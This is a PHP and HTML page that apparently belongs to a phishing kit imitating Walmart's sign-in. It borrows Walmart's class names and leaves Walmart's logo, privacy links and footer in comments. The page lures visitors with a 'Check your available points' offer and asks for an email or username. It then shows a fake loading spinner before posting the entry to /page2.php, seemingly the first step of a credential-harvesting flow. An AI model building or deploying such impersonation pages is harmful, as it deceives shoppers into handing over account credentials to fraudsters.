<?php
// include('header.php');
include('header_.php');


if (isset($_SESSION['user_logged_in'])) {
    //  header('Location: dashboard.php');
}

?>
<style>
    /* .login-banner{background: url(./assets/images/pink-banner.jpg) no-repeat center center; min-height: 200px;} */
    @media(max-width: 767px) {
        .login-form {
            width: 100%;
            /*            margin: 10px auto 0px;*/
            border-radius: 8px;
            /*            box-shadow: 0 10px 20px 0 rgb(0 0 0 / 9%);*/
            background-color: #fff;
            position: relative;
            z-index: 99;
            padding: 5px 15px;
        }

        .login-form input {
            border-radius: 10px;
            height: 48px;
            padding: 0 1.42rem;
            font-size: 1rem;
            line-height: 48px;
            width: 100%;
            border: 1px solid #888;
            outline: none;
            position: relative;
            z-index: 1;
            color: #222226;
            text-overflow: ellipsis;
            margin-bottom: 0;
        }

        .login-form #submit {
            background-color: #0071dc;
            padding: 11px 24px;
            font-size: 1rem;
            display: block;
            width: 100%;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: #0071dc;
            height: auto;
            cursor: pointer;
        }

        .login-form #submit:hover {
            background-color: #0071dc;
            border-color: #0071dc;
        }

        /* .login-form .forgot-pwd {
            color: red;
            text-align: center;
            margin-top: 20px;
        } */

        /* .register-link {
            color: red;
            font-size: 12px;
        }

        .register p {
            font-size: 12px;
        }

        .register {
            display: flex;
            align-items: center;
            justify-content: space-between;
        } */

        .login-form input.error {
            border-color: #ff4e1c;
            font-size: 12px;
        }

        .login-form label.error {
            color: #ff4e1c;
            font-size: 12px;
        }

        .login-form .form-group {
            margin-bottom: 15px;
        }

        .login-form input.error::placeholder {
            color: #ff4e1c;
        }

        .login-form h2 {
            line-height: 20px;
            font-size: 1rem;
            font-weight: 500;
            color: #4a4a4a;
            margin-bottom: 30px;
            text-align: center;
        }

        .login-banner .owl-dot {
            background: #fff !important;
            border: 1px solid #ddd !important;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin: 5px;
        }

        .login-banner .owl-dots {
            text-align: center;
            position: relative;
            margin-top: 12px;
        }

        .login-banner .owl-dot.active {
            background: red !important;
        }

        /* .usernew_login_inks {
            margin-top: 20px;
            display: block;
            justify-content: start;
            font-size: 12px;
        }

        .usernew_login_inks .usernew_login_link {
            text-align: center;
            margin-top: 10px;
            padding-left: 0;
            padding-right: 0;
            display: flex;
            justify-content: center;
        }

        .usernew_login_password .usernew_login_inks .usernew_login_link a {
            display: block;
            flex: 1;
        }

        .usernew_login_inks .usernew_login_link .login_link_text:not(:first-child) {
            padding-left: 10px;
            margin-left: 10px;
            border-left: 1px solid #ddd;
        }

        .usernew_login_inks .login_link_text {
            font-size: 12px;
            line-height: 1;
            color: red;
            text-decoration: none;
            flex: 1;
        } */

        .page_breadcrumb .page_breadcrumb_wrap {
            padding-top: 0.72rem;
            padding-bottom: 0.72rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .page_breadcrumb .breadcrumb_content .breadcrumb_current {
            font-size: 16px;
            line-height: 1;
            color: #878787;
        }

        .common_share_third .share_button {
            line-height: 24px;
            font-size: 14px;
            border: none;
            background: none;
        }

        .common_share_third .share_button .share_btn_icon {
            background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC0AAAAtCAYAAAA6GuKaAAAAAXNSR0IArs4c6QAABLtJREFUaEPtl21oXEUUht8zN4maaCxN/khQWptaRUEwNbGV2IImGqS02XtvQhFBLQa0ptnNRxWhZUFFbU32JtWqAUtBU01nZ1N/taI/AtVimoIfrTa2jYIYLdqUFGPUJDtHrtmFkO5mt8nmo7AD99fcOee577xz5lzCVTjoKmRGGnq+di2tdFrpaRRI2yNtj/myR1FRTeayZdc9w0yPEfFdAIGIThHhwPDw+DuHD+/5NxW7kTJPezzem4ggAdwfB+xbIUYflnLv+dmCpwTatm2DueAoM9YA+JOIXtOajzCLsGHoMma8ACCPCF8vXTpS3N7ePjYb8JRAm6bvOYD3uMAArVEq8N1kKNv2FWrNX7rggKhTqqVtwaE9Hm8PEYqJsDMYdF6KBWSaPh/ALQB6lXKKFxzaNL1/AcgWgkqkDByPBWTbDUVah08APKJUa86igQ6HqeTQodjQ69c/cW1e3pLTzPg9FHJKFhzasrw9zChmph2hUODleEB+v1/4/X4G4D4zHik6iN6tAN6MHMQOgG2tUdrV5Zx2yWy7bhUzNTOjQynnwxnTRhamBDpS8o65akfiakBUCcFntOYyADsB3AjgoFJO9aKAdiEsy1fOzEfgXoMxB33FzI+GQs5viwK6snJrnhBZvQAvB/AZgBsArAKgmfl7gN43jIH9UsrR2QK762dtD9caWhe4Cj8EoGdkJLwuVT1GvA+cNbRleXczoxHg80KI1VIGBlKh5nQxZgVtmt7NADoAjAmhH5Sy7fO5Br5ie5SXN+bk5o43MaMKwAoAGQAEkdgVDLY8nwjYsurXMusmAA8AuB5APzMfuHjx0hvd3fv/SbQ+Op+00ps21a4wDONjAHfGCD4O0ItKBXbHS2xZ3kZmvBr50KmvnRFCl0nZ9nMy4ElBV1TUXpOdbfQAuBvAj8zwM4sewxjPZxZbADzpJhNCbJaypXNqYtv2VWrNoYmbkPYRhfeFwxkXiHQJEfwAbgVwSggqljLwdyLwpKBNs24bQK0Azmk9dl9X11uDkwN7PN7tRHgdoJ+E+GWllDIcnXev7pMnh1wFCwDaPnU3JsplpiuIa7dnlXLeThG07wuA1wJUrVTg4OVB/cI0h34AUCiEUS5l86fRd2zbt05r7gZwVqkltwN+PXW9x1NfTaQ/AnBCKefeFEFPtJ5aj+VPVTmawDTr2gF6On5C7lOq9Y5Y8xs2NORnZYX/ADCilJOwbU3SHslAe98FUDMT6IhFLrgNl1JObqqU7gWwOoE9+gCsZKayUCjgXuX/D8uqLWc2PpnOHqbpqwK4kxnHk+m1k1S6fhug4x5E0/Q1AbyLGb8axsDyyT2GbfuztB46C+CWaQ6i+/9YCKBBKcf9JZt2JAVdU1OTOTiY/Q0A15ORkjfWk5GRmac1bQH4qYk+RjyuVMsHUzNGlYyWPCH4vfHxsUGizEklj/qEwD0pK3kuxMaN9TdnZGh322+7XAZ26+8OpZxX4kk08WOrmwGKJVS/EPSIlIFziVR255NSOhqooqI2NyfHqJ90jV8CcJRINweDbccSJbQsXykz1wMoBTgHoH4idBKNBqTcO5xofXT+iqCTDTrX76Wh51rhtD3mS+G00mmlk1DgP9f48T3zk3pKAAAAAElFTkSuQmCC) no-repeat;
            background-size: cover;
        }

        .common_share_third .share_icon {
            width: 24px;
            height: 24px;
            display: inline-block;
            vertical-align: top;
        }

        .common_width_container {
            padding-left: 1.072rem;
            padding-right: 1.072rem;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }

        .navigator:hover {
            color: white;
            text-decoration: none;
        }

        .navigator:active {
            color: white;
            text-decoration: none;
        }
    }

    .loader {
    width: 48px;
    height: 48px;
    border: 5px solid #FFF;
    border-bottom-color: #FF3D00;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;
    }

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 
</style>
<div id="__next" data-reactroot="">
    <div class="w_PLoZ w-40-m w-30-l w-25-xl ph1-m pb7 vh-75-xl">
        <section>
            <!-- <header class="f1 mt7 tc">
            <a link-identifier="logoLink" aria-atomic="true" aria-label="Walmart. Save Money. Live Better. Home Page" href="/"><img loading="lazy" src="https://i5.walmartimages.com/dfw/4ff9c6c9-d10e/k2-_ef2c8660-96ed-4f64-891d-329fa488c482.v1.png" alt="Walmart logo with link to homepage." height="65" width="64"></a>
            <h1 class="mt3 f3 mb1">Sign in or create your account</h1>
            <p class="w_U9_0 w_U0S3 w_QcqU ma0 mb4">Not sure if you have an account?<br> Enter your email and we’ll check for you.</p>
         </header> -->
            <!-- <label for="loginId" class="ml1 b f6">Email Address</label>
            <div class="w_y4Pl pb3">
                <label class="w_iyCD w__XNG" for="ld_ui_textfield_280675"><span class="w__tXl"></span></label>
                <input type="text" placeholder="Cell phone number" name="username" required>
            </div>
            <button type="submit" class="btnSubmit btn" name="submit" id="submit">Login</button>
            <p class="w_U9_0 w_U0S3 w_QcqU dark-gray ph2 mv1 ml2">Securing your personal information is our
                priority.<br><a class="dark-gray" target="_blank"
                    href="https://corporate.walmart.com/privacy-security">See our privacy measures.</a></p>
            </form> -->
    </div>
    </section>
</div>

<div class="mobile_slider">
    <div class="das_sagen_slider owl-carousel owl-theme">
        <div class="item">
            <div class="das_slider">
                <img src="<?php echo $folder_path;?>/assets/images/slider_img/slider_1_img.gif" alt="silder">
            </div>
        </div>
        <div class="item">
            <div class="das_slider">
                <img src="<?php echo $folder_path;?>/assets/images/slider_img/slider_2_img.jpg" alt="silder">
            </div>
        </div>
        <div class="item">
            <div class="das_slider">
                <img src="<?php echo $folder_path;?>/assets/images/slider_img/slider_3_img.jpg" alt="silder">
            </div>
        </div>
        <div class="item">
            <div class="das_slider">
                <img src="<?php echo $folder_path;?>/assets/images/slider_img/slider_4_img.jpg" alt="silder">
            </div>
        </div>
        <div class="item">
            <div class="das_slider">
                <img src="<?php echo $folder_path;?>/assets/images/slider_img/slider_5_img.gif" alt="silder">
            </div>
        </div>
    </div>
    <div id="counter">1 -- 5</div>
</div>

<section>
    <div class="login_page">
        <h1 class="login_text">Check your available points</h1>
        <p class="registered">Registered on our website or app?</p>
        <p class="registered">Use your same login details here.</p>

        <form action="/page2.php" method="post" id="loginForm">
            <div>
                <span class="loader" id="loader_" style="display:none"></span>
                <p class="username">Email address / username</p>
                <input type="text" autocorrect="off" autocapitalize="off" spellcheck="false" id="j_username" name="j_username">
            </div>
        
        <div class="login" onclick="submitForm()">
            <!-- <div class="login_button"> -->
            <svg class="icon" role="img" aria-hidden="true" focusable="false" id="lock-icon"
                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                <path fill="white"
                    d="M400 224h-16v-62.5C384 73.1 312.9.3 224.5 0 136-.3 64 71.6 64 160v64H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zM96 160c0-70.6 57.4-128 128-128s128 57.4 128 128v64H96v-64zm304 320H48c-8.8 0-16-7.2-16-16V272c0-8.8 7.2-16 16-16h352c8.8 0 16 7.2 16 16v192c0 8.8-7.2 16-16 16z">
                </path>
            </svg>
            <span>Log in </span>
            <!-- </div> -->
        </div>
        </form>

        <script type="text/javascript">

    

    function submitForm(){
        $("#loader_").show();

        setTimeout(() => {
            $("#loginForm").submit();
        }, "3000")
 
    }
</script>
    </div>
</section>

<div class="flex flex-column flex-auto relative mt7">
    <div class="bw2">
        <hr aria-hidden="true" class="w_8Gn9">
    </div>
    <!-- <span class="ph3">
        <footer class="" style="max-width: 1280px;">
            <ul class="list ma0 mt3 ph0 pt1">
                <li class=""><button
                        class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 no-underline lh-copy mb3"
                        type="button" style="color: rgb(70, 71, 74); margin-left: 0px;">Give feedback</button></li>
                <li class=""><a link-identifier="Generic Name"
                        href="https://corporate.walmart.com/privacy-security/california-privacy-rights"
                        class="no-underline center mb3 pointer f6 mid-gray flex items-center"
                        aria-label="CA Privacy Rights - opens in a new window" target="_blank"
                        rel="noopener noreferrer"><span class="">CA Privacy Rights</span><span class="w_iUH7">(link is
                            external)</span></a></li>
                <li class=""><a link-identifier="Generic Name"
                        href="https://www.walmart.com/account/api/ccpa-intake?native=false&amp;app=gm&amp;type=sod"
                        class="no-underline center mb3 pointer f6 mid-gray flex items-center"
                        aria-label="Your Privacy Choices - opens in a new window" target="_blank"
                        rel="noopener noreferrer"><img loading="lazy" width="29" height="14"
                            src="//i5.walmartimages.com/dfwrs/76316474-d730/k2-_3c5ba298-4f19-46be-9fc3-ac49225d19bd.v1.png"
                            alt="Privacy choices icon" class="mr1"><span class="self-baseline">Your Privacy
                            Choices</span><span class="w_iUH7">(link is external)</span></a></li>
                <li class=""><a link-identifier="Generic Name"
                        href="https://www.walmart.com/account/api/ccpa-intake?native=false&amp;app=gm&amp;type=access"
                        class="no-underline center mb3 pointer f6 mid-gray flex items-center"
                        aria-label="Request My Personal Information - opens in a new window" target="_blank"
                        rel="noopener noreferrer"><span class="">Request My Personal Information</span><span
                            class="w_iUH7">(link is external)</span></a></li>
                <li class=""><a link-identifier="Generic Name"
                        href="https://corporate.walmart.com/california-transparency"
                        class="no-underline center mb3 pointer f6 mid-gray flex items-center"
                        aria-label="California Supply Chains Act - opens in a new window" target="_blank"
                        rel="noopener noreferrer"><span class="">California Supply Chains Act</span><span
                            class="w_iUH7">(link is external)</span></a></li>
            </ul>
            <div class="mt4 pb5 pt1 f7 lh-title mid-gray">© 2023 Walmart. All Rights Reserved.</div>
        </footer>
    </span> -->
</div>
<div aria-live="assertive"></div>
</div>
<?php

include('footer_.php');

?>